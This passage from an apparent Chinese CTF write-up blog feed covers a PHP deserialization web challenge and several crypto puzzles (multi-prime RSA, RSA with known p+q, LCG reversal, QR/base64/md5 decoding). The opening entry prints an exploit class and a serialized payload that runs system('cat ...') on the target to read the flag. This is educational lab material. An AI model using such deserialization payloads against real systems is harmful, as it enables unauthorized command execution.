boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><p>flag文件为<strong>fffffffffflagafag</strong></p><p>所以最终exp为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[XSCTF]crypto-baigeiRSA2</title>
      <link href="/2022/10/19/32912e227acf-q1jun/"/>
      <url>/2022/10/19/32912e227acf-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">n = <span class="number">5</span></span><br><span class="line">size = <span class="number">64</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ps = [number.getPrime(size) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(ps)) == n:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = reduce(<span class="keyword">lambda</span> x, y: x*y, ps)</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921</span></span><br><span class="line">c = <span class="number">144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168</span></span><br></pre></td></tr></table></figure><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>​    </p><p>从题目中的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">5</span></span><br><span class="line">size = <span class="number">64</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ps = [number.getPrime(size) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(ps)) == n:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以看出n是由5组素数相乘组成的</p><p>到<a target="_blank" rel="noopener" href="http://factordb.com/index.php">factordb.com</a>大数分解</p><p>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">9401433281508038261</span>*<span class="number">10252499084912054759</span>*<span class="number">11215197893925590897</span>*<span class="number">11855687732085186571</span>*<span class="number">13716847112310466417</span></span><br></pre></td></tr></table></figure><p>即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921</span></span><br><span class="line">c = <span class="number">144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168</span></span><br><span class="line">p1 = <span class="number">9401433281508038261</span></span><br><span class="line">p2 = <span class="number">10252499084912054759</span></span><br><span class="line">p3 = <span class="number">11215197893925590897</span></span><br><span class="line">p4 = <span class="number">11855687732085186571</span></span><br><span class="line">p5 = <span class="number">13716847112310466417</span></span><br><span class="line"><span class="keyword">assert</span> n == p1*p2*p3*p4*p5</span><br></pre></td></tr></table></figure><p><code>assert</code>检测通过</p><p>再由：<br>$$<br>\phi(n) &#x3D; (p_1-1)\cdot(p_2-1)\cdot(p_3-1)\cdot(p_4-1)\cdot(p_5-1)<br>$$<br>最后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phi = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)*(p3-<span class="number">1</span>)*(p4-<span class="number">1</span>)*(p5-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221019195612672.png" alt="image-20221019195612672"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[XSCTF]crypto-一元二次方程组</title>
      <link href="/2022/10/19/77e56cb6490b-q1jun/"/>
      <url>/2022/10/19/77e56cb6490b-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">256</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">avg = (p+q)/<span class="number">2</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;avg = %d&#x27;</span> % avg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601</span></span><br><span class="line">avg = <span class="number">75635892913589759545076958131039534718834447688923830032758709253942408722875</span></span><br><span class="line">c = <span class="number">888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503</span></span><br></pre></td></tr></table></figure><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>解方程组，由<br>$$<br>\phi(n) &#x3D; (q-1)\times(p-1)<br>$$<br>得到<br>$$<br>\phi(n)&#x3D;p\times{q}-(p+q)+1<br>$$<br>这里的<code>p*q=n</code>已知，$p+q$可以用<code>avg*2</code>代替.</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601</span></span><br><span class="line">avg = <span class="number">75635892913589759545076958131039534718834447688923830032758709253942408722875</span></span><br><span class="line">c = <span class="number">888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503</span></span><br><span class="line">phi = n - avg*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">long_to_bytes(m)</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221019193754543.png" alt="image-20221019193754543"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUctf]crypto-LCG Revenge</title>
      <link href="/2022/10/13/ac0b312ad234-q1jun/"/>
      <url>/2022/10/13/ac0b312ad234-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221013180119116.png" alt="image-20221013180119116"></p><p>附件📎：LCG-Revenge.zip</p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>附件中有两个文件：</p><ul><li>task.py <code>加密脚本</code></li><li>output.txt <code>输出数据</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">step = <span class="built_in">len</span>(FLAG) // <span class="number">3</span></span><br><span class="line">xs = [bytes_to_long(FLAG[:step]), bytes_to_long(FLAG[step:<span class="number">2</span>*step]), bytes_to_long(FLAG[<span class="number">2</span>*step:])]</span><br><span class="line">a = getPrime(<span class="number">64</span>)</span><br><span class="line">b = getPrime(<span class="number">64</span>)</span><br><span class="line">c = getPrime(<span class="number">64</span>)</span><br><span class="line">a = <span class="number">18038175596386287827</span></span><br><span class="line">b = <span class="number">15503291946093443851</span></span><br><span class="line">c = <span class="number">17270168560153510007</span></span><br><span class="line">p = <span class="number">307956849617421078439840909609638388517</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_state = (a*xs[<span class="number">0</span>] + b*xs[<span class="number">1</span>] + c*xs[<span class="number">2</span>]) % p </span><br><span class="line">    xs = xs[<span class="number">1</span>:] + [new_state]</span><br><span class="line">    <span class="comment">#print(xs)</span></span><br><span class="line"><span class="built_in">print</span>(xs)</span><br><span class="line"><span class="built_in">print</span>(a, b, c, p)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[255290883651191064919890629542861653873, 221128501895959214555166046983862519384, 108104020183858879999084358722168548984]</span><br><span class="line">18038175596386287827 15503291946093443851 17270168560153510007 307956849617421078439840909609638388517</span><br></pre></td></tr></table></figure><h3 id="0x0201-分析加密脚本"><a href="#0x0201-分析加密脚本" class="headerlink" title="0x0201 分析加密脚本"></a>0x0201 分析加密脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">step = <span class="built_in">len</span>(FLAG) // <span class="number">3</span></span><br><span class="line">xs = [bytes_to_long(FLAG[:step]), bytes_to_long(FLAG[step:<span class="number">2</span>*step]), bytes_to_long(FLAG[<span class="number">2</span>*step:])]</span><br></pre></td></tr></table></figure><p>这一步将flag分成三等份，由<code>bytes_to_long</code>转换位数字，用于加密计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = getPrime(<span class="number">64</span>)</span><br><span class="line">b = getPrime(<span class="number">64</span>)</span><br><span class="line">c = getPrime(<span class="number">64</span>)</span><br><span class="line">a = <span class="number">18038175596386287827</span></span><br><span class="line">b = <span class="number">15503291946093443851</span></span><br><span class="line">c = <span class="number">17270168560153510007</span></span><br><span class="line">p = <span class="number">307956849617421078439840909609638388517</span></span><br></pre></td></tr></table></figure><p>给出<code>a、b、c、p</code>的数值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_state = (a*xs[<span class="number">0</span>] + b*xs[<span class="number">1</span>] + c*xs[<span class="number">2</span>]) % p </span><br><span class="line">    xs = xs[<span class="number">1</span>:] + [new_state]</span><br></pre></td></tr></table></figure><p>这一步就是简单的LCG加密步骤了，将三等份的flag分步用abc相乘，然后相加取模。</p><p><code>xs = xs[1:] + [new_state]</code>这一步相当于一个队列，将flag的第一部分丢掉，在队尾插入新的<code>new_state</code>。</p><h3 id="0x0202-解密脚本"><a href="#0x0202-解密脚本" class="headerlink" title="0x0202 解密脚本"></a>0x0202 解密脚本</h3><p>通过分析，可以看出最后输出的<code>xs</code>就是加密完之后的三串数字，只需要一个一个往前推算，就可以算出一开始的<code>xs</code>数组。</p><p>设</p><p>$n$ &#x3D; <code>new_state</code>,</p><p>$a$ &#x3D; <code>a</code>,</p><p>$b$ &#x3D; <code>b</code>,</p><p>$c$ &#x3D; <code>c</code>,</p><p>$x_1$ &#x3D; <code>xs[0]</code>,</p><p>$x_2$ &#x3D; <code>xs[1]</code>,</p><p>$x_3$ &#x3D; <code>xs[2]</code>,</p><p>$p$ &#x3D; <code>p</code></p><p>由原式：<br>$$<br>n &#x3D; (a\cdot x_1+b\cdot x_2+c\cdot x_3)mod\space p<br>$$<br>可得:<br>$$<br>x_1 &#x3D; (a^{-1}(n-b\cdot x_2-c\cdot x_3))mod\space{p}<br>$$</p><blockquote><p>注：$a^{-1}$为$a$关于模$p$的模逆元。</p></blockquote><p>以此类推可以推出最初开始运算的三等份flag。</p><p>最终脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">xs=[</span><br><span class="line">    <span class="comment"># 211953980103675814981551589541062177303,</span></span><br><span class="line">    <span class="number">255290883651191064919890629542861653873</span>,</span><br><span class="line">    <span class="number">221128501895959214555166046983862519384</span>,</span><br><span class="line">    <span class="number">108104020183858879999084358722168548984</span>,</span><br><span class="line">    ]</span><br><span class="line"><span class="comment">#new_state = (a*xs[0] + b*xs[1] + c*xs[2]) % p</span></span><br><span class="line"><span class="comment"># xs1 = 255290883651191064919890629542861653873</span></span><br><span class="line"><span class="comment"># xs2 = 221128501895959214555166046983862519384</span></span><br><span class="line"><span class="comment"># new_state = 108104020183858879999084358722168548984</span></span><br><span class="line">a = <span class="number">18038175596386287827</span></span><br><span class="line">b = <span class="number">15503291946093443851</span></span><br><span class="line">c = <span class="number">17270168560153510007</span></span><br><span class="line">p = <span class="number">307956849617421078439840909609638388517</span></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>]<span class="comment">#模逆运算</span></span><br><span class="line">a_1 = MMI(a,p) <span class="comment">#a相对于模数p的逆元</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    xs0 = (a_1*(xs[<span class="number">2</span>]-b*xs[<span class="number">0</span>]-c*xs[<span class="number">1</span>])) % p</span><br><span class="line">    xs = [xs0] + xs[:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(xs)</span><br><span class="line"><span class="built_in">print</span>((a*xs[<span class="number">0</span>] + b*xs[<span class="number">1</span>] + c*xs[<span class="number">2</span>]) % p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(xs[<span class="number">0</span>])+long_to_bytes(xs[<span class="number">1</span>])+long_to_bytes(xs[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221013182348378.png" alt="image-20221013182348378"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]crypto-继续扫吧要有耐心</title>
      <link href="/2022/10/07/ecd2ba710837-q1jun/"/>
      <url>/2022/10/07/ecd2ba710837-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007233832420.png" alt="image-20221007233832420"></p><p>附件📎：attachment.rar</p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>下载下来附件，解压之后发现是几千张二维码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007233950494.png" alt="image-20221007233950494"></p><p>手动一个一个扫肯定是不可能的了，用python里面的<strong>pyzbar</strong>包进行自动扫码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br></pre></td></tr></table></figure><p>这里遇到了一个坑，<code>os.listdir</code>读取的文件夹里面的图片是乱序的，最后得出来的编码也是乱序，导致在这里卡了一会儿。</p><p>需要进行排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = <span class="built_in">sorted</span>(os.listdir(image_path),key = <span class="keyword">lambda</span> x:<span class="built_in">int</span>(x[:-<span class="number">4</span>]))</span><br></pre></td></tr></table></figure><p>然后发现输出的是一串串base64编码，直接把所有base64丢到base64解码器里面是解不出来的，因为里面穿插了一些摩斯密码。</p><p>摩斯密码解密出来的字符都是无用的，所以这些摩斯密码都是干扰你的，需要去除：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#去除摩斯密码</span></span><br><span class="line">qrInfo = qrInfo.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后以<code>=</code>为分界线进行一行一行输出</p><p>处理过后的base64编码一共有30行</p><p>解码base64之后发现还有一层base64，所以这是<strong>双层base64编码</strong>，需要解码两次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">debase = base64.b64decode(base64.b64decode(str1)).decode()</span><br></pre></td></tr></table></figure><p>双层解密之后最后得到的编码如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007234744746.png" alt="image-20221007234744746"></p><p>发现都是一些32位的md5，</p><p>一个一个去<code>cmd5.com</code>查表，发现一行md5代表一个字母或数字<em>（也可能是“{” “}”)</em></p><p>那么可以通过已知字典进行md5加密一一对比，爆破出flag，所以最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> encodings <span class="keyword">import</span> utf_8</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wordlist = <span class="string">&#x27;abcdefghijklmnopqrstuvwxwz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">image_path = <span class="string">&#x27;./qrcode&#x27;</span></span><br><span class="line">images = []</span><br><span class="line">str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># parseQrcode(&#x27;./qrcode/1.png&#x27;)</span></span><br><span class="line">list1 = <span class="built_in">sorted</span>(os.listdir(image_path),key = <span class="keyword">lambda</span> x:<span class="built_in">int</span>(x[:-<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> list1:</span><br><span class="line">    images.append(f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">    filePath = <span class="built_in">str</span>(image_path+<span class="string">&#x27;/&#x27;</span>+image)</span><br><span class="line">    img = cv.imread(filePath)</span><br><span class="line">    texts = decode(img)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">        qrInfo = text.data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> qrInfo == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="comment"># print(str1,end=&#x27;\n&#x27;)</span></span><br><span class="line">            str1 += <span class="string">&#x27;&#x27;</span>.join(qrInfo)</span><br><span class="line">            debase = base64.b64decode(base64.b64decode(str1)).decode()</span><br><span class="line">            <span class="comment"># print(str1)</span></span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> wordlist:</span><br><span class="line">                md5 = hashlib.md5(word.encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> md5 == debase:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27; <span class="subst">&#123;debase&#125;</span> = <span class="subst">&#123;word&#125;</span>&#x27;</span>)</span><br><span class="line">                    m += <span class="string">&#x27;&#x27;</span>.join(word)</span><br><span class="line">            str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#替换摩斯密码</span></span><br><span class="line">            qrInfo = qrInfo.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            str1 += <span class="string">&#x27;&#x27;</span>.join(qrInfo)</span><br><span class="line"><span 